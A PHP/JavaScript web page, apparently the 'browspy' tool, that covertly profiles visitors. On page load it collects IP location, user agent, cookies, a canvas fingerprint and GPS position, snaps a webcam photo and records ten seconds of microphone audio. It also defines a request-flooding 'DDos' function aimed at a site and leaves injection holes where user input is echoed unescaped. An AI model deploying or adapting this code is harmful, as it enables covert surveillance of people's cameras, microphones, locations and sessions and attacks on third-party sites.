<?php

if (isset($_GET['lat'])) {

    // 根据经纬度判断详细位置
    $lat=$_GET['lat'];
    $lon=$_GET['lon'];
    // 百度经纬度查询地址
    // 请求方式：GET
    // 默认返回json
    $url='http://lbs.juhe.cn/api/getaddressbylngb?lngx='.$lon.'&lngy='.$lat;
    $result=file_get_contents($url);
    $json=json_decode($result);
    exit($json->row->result->formatted_address);
}

$IP=$_SERVER[REMOTE_ADDR];
$USER_AGENT=$_SERVER[HTTP_USER_AGENT];

// 根据ip查询位置
$url='http://ip.taobao.com/service/getIpInfo.php?ip='.$IP;
$result=file_get_contents($url);
$json=json_decode($result);

$COUNTRY=$json->data->country;
$REGION=$json->data->region;
$CITY=$json->data->city;

$TIME=date('Y-m-d h:m:s',time());

?>

<script>

var info={
    ip:'<?=$IP?>',
    ip_addr:{
        country:'<?=$COUNTRY?>',
        region:'<?=$REGION?>',
        city:'<?=$CITY?>',
    },
    agent:'<?=$USER_AGENT?>',
    geo:{
        support:null,
        error_code:null,
        lat:null,
        lon:null,
        address:null,
    },
    cookie:null,
    time:'<?=$TIME?>',
    canvas_id:null,
    selfie:null,
    platform:null,
    device:null,
    window_screen:null,
    blob:null,
    download_speed:null,
};

info.cookie=document.cookie;

function ajax(url,foo){
    var xmlhttp=new XMLHttpRequest();
    xmlhttp.onreadystatechange=function(){
        if (xmlhttp.readyState==4 && xmlhttp.status==200) {
            foo(xmlhttp.responseText);
        };
    };
    xmlhttp.open('GET',url,true);
    xmlhttp.send();
}

function bin2hex(bin){
    var i=0, l=bin.length,chr,hex='';
    for (i; i < l; ++i){
        chr=bin.charCodeAt(i).toString(16);
        hex+=chr.length<2 ? '0'+chr : chr;
    }
    return hex;
}

function detectOS(){
    var sUserAgent=navigator.userAgent;
    var isWin = (navigator.platform == "Win32") || (navigator.platform == "Windows");

    var isMac = (navigator.platform == "Mac68K") || (navigator.platform == "MacPPC") || (navigator.platform == "Macintosh") || (navigator.platform == "MacIntel");
    if (isMac) return "Mac";

    var bIsIpad = sUserAgent.match(/ipad/i) == "ipad";
    if (bIsIpad) return "iPad";
    
    var isUnix = (navigator.platform == "X11") && !isWin && !isMac;
    if (isUnix) return "Unix";
    
    var isLinux = (String(navigator.platform).indexOf("Linux") > -1);
    var bIsAndroid = sUserAgent.toLowerCase().match(/android/i) == "android";
    if (isLinux) {
        if(bIsAndroid) return "Android";
        else return "Linux";
    }

    var bIsCE = sUserAgent.match(/windows ce/i) == "windows ce";
    if (bIsCE) return "WinCE";

    var bIsWM = sUserAgent.match(/windows mobile/i) == "windows mobile";
    if (bIsWM) return "WinMobile";

    if (isWin) {
        var isWin2K = sUserAgent.indexOf("Windows NT 5.0") > -1 || sUserAgent.indexOf("Windows 2000") > -1; 
        if (isWin2K) return "Win2000";

        var isWinXP = sUserAgent.indexOf("Windows NT 5.1") > -1 || sUserAgent.indexOf("Windows XP") > -1; 
        if (isWinXP) return "WinXP";

        var isWin2003 = sUserAgent.indexOf("Windows NT 5.2") > -1 || sUserAgent.indexOf("Windows 2003") > -1; 
        if (isWin2003) return "Win2003";

        var isWinVista= sUserAgent.indexOf("Windows NT 6.0") > -1 || sUserAgent.indexOf("Windows Vista") > -1; 
        if (isWinVista) return "WinVista";

        var isWin7 = sUserAgent.indexOf("Windows NT 6.1") > -1 || sUserAgent.indexOf("Windows 7") > -1; 
        if (isWin7) return "Win7";

        var isWin8 = sUserAgent.indexOf("Windows NT 6.2") > -1 || sUserAgent.indexOf("Windows 8") > -1;
        if (isWin8) return "Win8";
    }

    return "Unknow";
}

function send_info(){
    var jsonText=JSON.stringify(info);
    console.log(jsonText);
}

// 获取屏幕分辨率的宽高,并判断操作系统,设备型号
function device_platform(){
    info.platform=detectOS();
    info.window_screen=String(window.screen.width)+'x'+String(window.screen.height);
}

// 拍照
// Need to request permission
function selfie(){
    window.URL = window.URL || window.webkitURL;
    navigator.getUserMedia=navigator.getUserMedia || navigator.webkitGetUserMedia || navigator.mozGetUserMedia || navigator.msGetUserMedia;

    // 创建video元素
    var video=document.createElement('video'),
    videoObj={'video':true},
    errBack=function(error){
        console.log('Video capture error: ',error.name);
        info.selfie=error.name;
    };

    // 获取媒体
    if(navigator.getUserMedia){
        navigator.getUserMedia(videoObj,function(stream){
            video.src=window.URL.createObjectURL(stream);
            video.play();

            video.onloadedmetadata = function(e) {
                setTimeout(function(){
                    if(info.selfie==null){
                        // 截取图片
                        var canvas=document.createElement('canvas'),
                        ctx=canvas.getContext('2d');
                        canvas.width=640;
                        canvas.height=480;
                        ctx.drawImage(video,0,0,640,480);
                        var image=canvas.toDataURL('image/png');
                        info.selfie=image;
                        console.log('Take selfie successful!');

                        // 关闭摄像头
                        stream.stop();
                        video.src='';
                    };
                },3000);
            };
        },errBack);
    }
}

// 录音
// Need to request permission
function voice_record(){
    window.URL=window.URL || window.webkitURL;
    navigator.getUserMedia=navigator.getUserMedia || navigator.webkitGetUserMedia || navigator.mozGetUserMedia || navigator.msGetUserMedia;
    window.AudioContext=window.AudioContext || window.webkitAudioContext || window.mozAudioContext || window.msAudioContext;

    var HZRecorder=function(stream,config){
        config=config || {};
        // 采样数8位
        config.sampleBits=config.sampleBits || 8;
        // 采样率(1/6 44100)
        config.sampleRate=config.sampleRate || (44100/6);

        var context=new window.AudioContext();
        var audioInput=context.createMediaStreamSource(stream);
        var recorder=context.createScriptProcessor(4096,1,1);

        var audioData={
            size:0, // 录音文件长度
            buffer:[], // 录音缓存
            inputSampleRate:context.sampleRate, // 输入采样率
            inputSampleBits:16, // 输入采样数位 16
            outputSampleRate:config.sampleRate, // 输出采样率
            oututSampleBits:config.sampleBits, // 输出采样数位 8
            input:function(data){
                this.buffer.push(new Float32Array(data));
                this.size+=data.length;
            },
            //合并压缩
            compress:function(){
                //合并
                var data=new Float32Array(this.size);
                var offset=0;
                for (var i=0; i<this.buffer.length; i++){
                    data.set(this.buffer[i],offset);
                    offset+=this.buffer[i].length;
                }
                //压缩
                var compression=parseInt(this.inputSampleRate / this.outputSampleRate);
                var length=data.length / compression;
                var result=new Float32Array(length);
                var index=0,j=0;
                while (index<length){
                    result[index]=data[j];
                    j+=compression;
                    index++;
                }
                return result;
            },
            encodeWAV:function(){
                var sampleRate=Math.min(this.inputSampleRate, this.outputSampleRate);
                var sampleBits=Math.min(this.inputSampleBits, this.oututSampleBits);
                var bytes=this.compress();
                var dataLength=bytes.length*(sampleBits/8);
                var buffer=new ArrayBuffer(44+dataLength);
                var data=new DataView(buffer);

                // 单声道
                var channelCount=1;
                var offset=0;

                var writeString=function(str){
                    for (var i=0; i<str.length; i++){
                        data.setUint8(offset+i, str.charCodeAt(i));
                    }
                };
                
                // 资源交换文件标识符 
                writeString('RIFF'); offset+=4;
                // 下个地址开始到文件尾总字节数,即文件大小-8 
                data.setUint32(offset, 36+dataLength, true); offset += 4;
                // WAV文件标志
                writeString('WAVE'); offset+=4;
                // 波形格式标志 
                writeString('fmt '); offset+=4;
                // 过滤字节,一般为 0x10 = 16 
                data.setUint32(offset, 16, true); offset+=4;
                // 格式类别 (PCM形式采样数据) 
                data.setUint16(offset, 1, true); offset+=2;
                // 通道数 
                data.setUint16(offset, channelCount, true); offset+=2;
                // 采样率,每秒样本数,表示每个通道的播放速度 
                data.setUint32(offset, sampleRate, true); offset+=4;
                // 波形数据传输率 (每秒平均字节数) 单声道×每秒数据位数×每样本数据位/8 
                data.setUint32(offset, channelCount * sampleRate * (sampleBits / 8), true); offset += 4;
                // 快数据调整数 采样一次占用字节数 单声道×每样本的数据位数/8 
                data.setUint16(offset, channelCount * (sampleBits / 8), true); offset += 2;
                // 每样本数据位数 
                data.setUint16(offset, sampleBits, true); offset+=2;
                // 数据标识符 
                writeString('data'); offset+=4;
                // 采样数据总数,即数据总大小-44 
                data.setUint32(offset, dataLength, true); offset+=4;
                // 写入采样数据 
                if(sampleBits===8){
                    for (var i=0; i<bytes.length; i++,offset++) {
                        var s=Math.max(-1, Math.min(1, bytes[i]));
                        var val=s<0 ? s*0x8000 : s*0x7FFF;
                        val=parseInt(255 / (65535 / (val+32768)));
                        data.setInt8(offset,val,true);
                    }
                }
                else{
                    for (var i=0; i<bytes.length; i++,offset+=2) {
                        var s=Math.max(-1, Math.min(1, bytes[i]));
                        data.setInt16(offset, s<0 ? s*0x8000 : s*0x7FFF, true);
                    }
                }
                return new Blob([data], {type:'audio/wav'});
            }
        };

        // 音频采集
        recorder.onaudioprocess=function(e){
            audioData.input(e.inputBuffer.getChannelData(0));
        }

        // 开始录音
        this.start=function(){
            audioInput.connect(recorder);
            recorder.connect(context.destination);
        }

        // 停止录音
        this.stop=function(){
            stream.stop();
            recorder.disconnect();
        }

        // 获取音频文件
        this.getBlob=function(){
            this.stop();
            return audioData.encodeWAV();
        }
    };

    // 抛出异常
    HZRecorder.throwError=function(message){
        console.log(message);
        throw new function () { this.toString = function () { return message; } }
    }

    // 是否支持录音
    HZRecorder.canRecording=(navigator.getUserMedia != null);

    // 获取录音机
    HZRecorder.get=function (callback,config){
        if (callback){
            if (navigator.getUserMedia){
                navigator.getUserMedia(
                    {audio:true},
                    function (stream){
                        var rec = new HZRecorder(stream, config);
                        callback(rec);
                    },
                    function (error){
                        switch (error.code || error.name) {
                            case 'PERMISSION_DENIED':
                            case 'PermissionDeniedError':
                                HZRecorder.throwError('用户拒绝提供信息');
                                break;
                            case 'NOT_SUPPORTED_ERROR':
                            case 'NotSupportedError':
                                HZRecorder.throwError('浏览器不支持硬件设备');
                                break;
                            case 'MANDATORY_UNSATISFIED_ERROR':
                            case 'MandatoryUnsatisfiedError':
                                HZRecorder.throwError('无法发现指定的硬件设备');
                                break;
                            default:
                                HZRecorder.throwError('无法打开麦克风。异常信息:' + (error.code || error.name));
                                break;
                        }
                    });
            }
            else{
                HZRecorder.throwErr('当前浏览器不支持录音功能。');
                return;
            }
        }
    };

    window.HZRecorder=HZRecorder;

    var recorder;
    HZRecorder.get(function (rec) {
        recorder=rec;
        recorder.start();
    });

    // 录音10s
    setTimeout(function(){
        var blob=recorder.getBlob();
        info.blob=blob;
        console.log('voice record finished.');
    },10000);
}

// DDos攻击
function DDos(site){
    // CSRF
    setInterval(ajax(site,function(){
        console.log('DDos ',site);
    }),50);
}

// 内网扫描
// JS-Recon
function intranetScan(){}

// 利用canvas定位唯一标识
function canvas_id(){
    var canvas=document.createElement('canvas');
    var ctx=canvas.getContext('2d');
    var txt='http://eular.github.io';
    ctx.textBaseline='top';
    ctx.font="14px 'Arial'";
    ctx.fillStyle='#0ff';
    ctx.fillRect(0,0,140,50);
    ctx.fillStyle='#00f';
    ctx.fillText(txt,2,15);
    ctx.fillStyle='rgba(102,204,0,0.7)';
    ctx.fillText(txt,4,17);

    var b64=canvas.toDataURL().replace('data:image/png;base64,','');
    var bin=atob(b64);
    var crc=bin2hex(bin.slice(-16,-12));
    console.log('Canvas id: '+crc);
    info.canvas_id=crc;
}

// 获取地理位置
function get_geolocation(){

    // check for Geolocation support
    function check_geolocation_support(){
        if (navigator.geolocation){
            console.log('Geolocation is supported!');
            return true;
        }
        else{
            console.log('Geolocation is not supported for this Browser/OS version yet.');
            return false;
        }
    }

    if (check_geolocation_support()) {

        info.geo.support=true;

        var geoOptions={
            maximumAge:5*60*1000,
            timeout:10*1000,
            enableHighAccuracy:true
        }
        var geoSuccess=function(position){
            info.geo.lat=position.coords.latitude;
            info.geo.lon=position.coords.longitude;
            console.log('Success get geolocation!');

            // 根据经纬度判断详细位置
            url='<?=$_SERVER[PHP_SELF]?>?lat='+info.geo.lat+'&lon='+info.geo.lon;
            ajax(url,function(addr){
                info.geo.address=addr;
            });
        };
        var geoError=function(error){
            info.geo.error_code=error.code;
            console.log('Error occurred. Error code:'+error.code);
            //error.code:
            // 0: 未知错误
            // 1: 权限不足
            // 2: 位置错误(位置供应商出错)
            // 3: 超时
        };
        navigator.geolocation.getCurrentPosition(geoSuccess,geoError,geoOptions);
    }
    else{
        info.geo.support=false;
    };

}

// 网络测速
function network_speed(){
    // 图片测速
    var image=new Image();
    // 图片大小: 1232.7kb
    size=1232.7;
    image.src='https://raw.githubusercontent.com/Urinx/browspy/master/screenshot/test.jpg';
    startTime=new Date().getTime();
    
    // 图片加载完毕
    image.onload=function(){
        endTime=new Date().getTime();
        // kb/s
        speed=size/((endTime-startTime)/1000);
        // 保留一位小数
        speed=parseInt(speed*10)/10;
        info.download_speed=speed+'kb/s';
        console.log('Download speed testing finished!');
    }

    /*
    // 音频测速
    var audio=new Audio();
    // 大小: 1.3M
    size=1235.87;
    audio.src='https://raw.githubusercontent.com/Urinx/browspy/master/screenshot/ValderFields.mp3';
    audio.volume=0;
    audio.play();

    startTime=new Date().getTime();

    var timer;
    timer=setInterval(function(){
        if (audio.networkState==1) {
            endTime=new Date().getTime();
            speed=size/((endTime-startTime)/1000);
            speed=parseInt(speed*10)/10;
            info.download_speed=speed+'kb/s';

            console.log('Download speed testing finished!');
            audio.stop();
            clearInterval(timer);
        };
    },100);
    */
}

window.onload=function(){
    device_platform();
    canvas_id();
    selfie();
    get_geolocation();
    network_speed();
    voice_record();
    //DDos('http://baidu.com');
};

</script>